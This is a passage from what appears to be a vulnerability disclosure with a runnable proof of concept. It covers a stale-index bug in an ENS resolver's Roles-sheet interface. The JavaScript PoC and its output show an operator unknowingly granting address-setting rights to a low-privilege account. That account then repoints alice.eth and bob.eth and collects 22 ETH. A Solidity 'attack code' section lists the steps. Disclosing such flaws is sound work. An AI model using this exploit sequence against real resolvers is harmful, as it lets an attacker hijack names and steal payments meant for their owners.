const act = (n, t) => { say(); rule(); say('  ' + n + '  ' + t); rule() }
const kv = (k, v) => say('    ' + String(k).padEnd(30) + ' ' + v)
const eth = (w) => formatEther(w).padStart(9) + ' ETH'
const ONE = 10n ** 18n

act('ACT 1', 'The target Roles-sheet code builds the calldata after one checkbox')
say('  A (departing) has manager-scope ROLE_SET_ADDR. B has ROLE_SET_TEXT only.')
say('  Operator opens A, removes A, reopens the row that took A index (B), ticks')
say('  one box (Set Content Hash).')
say()
const bug = replaySheet(1)
kv('account written', bug.account)
kv('B live roles', JSON.stringify(bug.liveRoles))
kv('Save live, zero user input', bug.saveLiveWithZeroInput)
kv('rolesToGrant', JSON.stringify(bug.rolesToGrant))
kv('rolesToRevoke', JSON.stringify(bug.rolesToRevoke))
if (getAddress(bug.account) !== B) throw new Error('premise broken: account written is not B')
const derived = buildCalldata(bug.account, bug.rolesToGrant)
say()
kv('rebuilt calldata', derived.slice(0, 46) + '...')
kv('captured on the wire', CAPTURED.slice(0, 46) + '...')
if (derived.toLowerCase() !== CAPTURED.toLowerCase()) throw new Error('calldata mismatch')
say('  >> byte-for-byte identical. grantRootRoles(0x101, B). The operator ticked')
say('     one box; the argument signed carries ROLE_SET_ADDR the operator never chose.')
say()
say('  NEGATIVE CONTROL, operator reopens a DIFFERENT index:')
const ctl = replaySheet(0)
kv('rolesToGrant', JSON.stringify(ctl.rolesToGrant))
if (ctl.rolesToGrant.includes('ROLE_SET_ADDR')) throw new Error('control granted ROLE_SET_ADDR')
say('    re-seeds correctly, no ROLE_SET_ADDR. The over-grant is the index reopen.')

act('ACT 2', 'Deploy the REAL PermissionedResolver behind its real ERC1967Proxy')
const chain = await Chain.create()
for (const a of [OPERATOR, B, ALICEOWN, BOBOWN, CUSTOMER]) await chain.fund(a, 100n * ONE)
const impl = await chain.deploy(OPERATOR, RESOLVER_BYTECODE, RESOLVER_ABI, [OPERATOR])
const initData = encodeFunctionData({ abi: RESOLVER_ABI, functionName: 'initialize', args: [OPERATOR, ALL_ROLES, []] })
const resolver = await chain.deploy(OPERATOR, PROXY_BYTECODE, PROXY_ABI, [impl, initData])
kv('resolver (proxy)', resolver)
const R = RESOLVER_ABI
const alice = namehash('alice.eth')
const bob = namehash('bob.eth')
await chain.send({ from: OPERATOR, to: resolver, abi: R, fn: 'grantRootRoles', args: [ROLE_SET_TEXT, B] })
await chain.send({ from: OPERATOR, to: resolver, abi: R, fn: 'setAddr', args: [alice, ALICEOWN] })
await chain.send({ from: OPERATOR, to: resolver, abi: R, fn: 'setAddr', args: [bob, BOBOWN] })
kv('B root roles bitmap', '0x' + (await chain.call({ to: resolver, abi: R, fn: 'roles', args: [0n, B] })).toString(16))
kv('addr(alice.eth)', (await chain.call({ to: resolver, abi: R, fn: 'addr', args: [alice] })))

act('ACT 3', 'CONTROL: before the grant, B cannot touch any name (real gate)')
for (const [node, name] of [[alice, 'alice.eth'], [bob, 'bob.eth']]) {
  let held = false
  try { await chain.send({ from: B, to: resolver, abi: R, fn: 'setAddr', args: [node, B] }) }
  catch (e) { if (!(e instanceof RevertError)) throw e; held = true; kv('B.setAddr(' + name + ') reverts', e.message) }
  if (!held) throw new Error('control failed: B could already setAddr')
}

act('ACT 4', 'The operator signs the CAPTURED calldata into the real resolver')
await chain.raw({ from: OPERATOR, to: resolver, data: CAPTURED, abi: R })
const has = (await chain.call({ to: resolver, abi: R, fn: 'hasRoles', args: [0n, ROLE_SET_ADDR, B] }))
kv('B root roles bitmap now', '0x' + (await chain.call({ to: resolver, abi: R, fn: 'roles', args: [0n, B] })).toString(16))
kv('B hasRoles(ROLE_SET_ADDR)', has)
if (!has) throw new Error('grant did not land')

act('ACT 5', 'B repoints the names it never had authority over, and collects')
await chain.send({ from: B, to: resolver, abi: R, fn: 'setAddr', args: [alice, B] })
await chain.send({ from: B, to: resolver, abi: R, fn: 'setAddr', args: [bob, B] })
const vBefore = await chain.balance(ALICEOWN)
const aBefore = await chain.balance(B)
let stolen = 0n
for (const [amt, node] of [[3n, alice], [7n, bob], [12n, alice]]) {
  const to = (await chain.call({ to: resolver, abi: R, fn: 'addr', args: [node] }))
  await chain.fund(to, (await chain.balance(to)) + amt * ONE) // customer pays the resolved address
  if (getAddress(to) === B) stolen += amt * ONE
}
const vAfter = await chain.balance(ALICEOWN)
const aAfter = await chain.balance(B)
say()
rule('-')
say('    account     before        after         delta')
say('    NAMEOWNER ' + eth(vBefore) + '  ' + eth(vAfter) + '  ' + eth(vAfter - vBefore))
say('    ATTACKER  ' + eth(aBefore) + '  ' + eth(aAfter) + '  ' + eth(aAfter - aBefore))
rule('-')
if (aAfter - aBefore !== stolen) throw new Error('ledger mismatch')
if (vAfter !== vBefore) throw new Error('name owner balance moved')
say()
say('  ' + formatEther(stolen) + ' ETH sent to names this resolver serves landed in the attacker account.')

```

### Output

```
==============================================================================
  ENS PoC: resolver Roles sheet grants root setAddr to a zero-authority
           account; the attacker collects the payments
  contract leg runs the REAL audited PermissionedResolver bytecode
==============================================================================

==============================================================================
  ACT 1  The target Roles-sheet code builds the calldata after one checkbox
==============================================================================
  A (departing) has manager-scope ROLE_SET_ADDR. B has ROLE_SET_TEXT only.
  Operator opens A, removes A, reopens the row that took A index (B), ticks
  one box (Set Content Hash).

    account written                0xbbBbbBBbbbbBBBbBBBbbbBBBBBBBbbbbbBBbbEEF
    B live roles                   ["ROLE_SET_TEXT"]
    Save live, zero user input     true
    rolesToGrant                   ["ROLE_SET_ADDR","ROLE_SET_CONTENTHASH"]
    rolesToRevoke                  ["ROLE_SET_TEXT"]

    rebuilt calldata               0x072d5d77000000000000000000000000000000000000...
    captured on the wire           0x072d5d77000000000000000000000000000000000000...
  >> byte-for-byte identical. grantRootRoles(0x101, B). The operator ticked
     one box; the argument signed carries ROLE_SET_ADDR the operator never chose.

  NEGATIVE CONTROL, operator reopens a DIFFERENT index:
    rolesToGrant                   ["ROLE_SET_CONTENTHASH"]
    re-seeds correctly, no ROLE_SET_ADDR. The over-grant is the index reopen.

==============================================================================
  ACT 2  Deploy the REAL PermissionedResolver behind its real ERC1967Proxy
==============================================================================
    resolver (proxy)               0xe7f1725e7734ce288f8367e1bb143e90bb3f0512
    B root roles bitmap            0x10
    addr(alice.eth)                0x000000000000000000000000000000000000a11c

==============================================================================
  ACT 3  CONTROL: before the grant, B cannot touch any name (real gate)
==============================================================================
    B.setAddr(alice.eth) reverts   EACUnauthorizedAccountRoles(0x48747133acbb0536f303b325b3407575875eb95645d81cd18bad559edf15d0de, 0x1, 0xbbBbbBBbbbbBBBbBBBbbbBBBBBBBbbbbbBBbbEEF)
    B.setAddr(bob.eth) reverts     EACUnauthorizedAccountRoles(0xe3f4672e728b79206ba500b850eb553d617e3156863fda5c15fb6e97ff4156e9, 0x1, 0xbbBbbBBbbbbBBBbBBBbbbBBBBBBBbbbbbBBbbEEF)

==============================================================================
  ACT 4  The operator signs the CAPTURED calldata into the real resolver
==============================================================================
    B root roles bitmap now        0x111
    B hasRoles(ROLE_SET_ADDR)      true

==============================================================================
  ACT 5  B repoints the names it never had authority over, and collects
==============================================================================

------------------------------------------------------------------------------
    account     before        after         delta
    NAMEOWNER       100 ETH        100 ETH          0 ETH
    ATTACKER        100 ETH        122 ETH         22 ETH
------------------------------------------------------------------------------

  22 ETH sent to names this resolver serves landed in the attacker account.
```

The ledger names the two wallets: the name owner receives 0 ETH, the attacker B receives 22 ETH.

## Attack code

```solidity
// 1. B is an ordinary low-role holder on the resolver, the account the operator
//    edits next. Root ROLE_SET_TEXT, zero address authority.
resolver.grantRootRoles(ROLE_SET_TEXT, B);

// 2. The operator removes a departing holder A (root ROLE_SET_ADDR). The Roles
//    list refetches. B shifts up into A's row index.

// 3. The operator opens the row now at that index (B) and ticks one box, Set
//    Content Hash. The sheet still holds A's permission map, because it re-seeds
//    on row.id, and row.id (the array index) did not change.

// 4. The operator signs one step shown as "Update roles for <B>":
resolver.grantRootRoles(ROLE_SET_ADDR | ROLE_SET_CONTENTHASH, B); // ROLE_SET_ADDR is A's, stale

// 5. B now sets the address record of every name the resolver serves.
resolver.setAddr(aliceNode, B);
resolver.setAddr(bobNode, B);
```

```
plant : the operator removes A, then reopens the vacated index and signs (grantRootRoles(0x101, B))
fire  : B.setAddr(name, B) on every name the resolver serves, then collects the payments
```
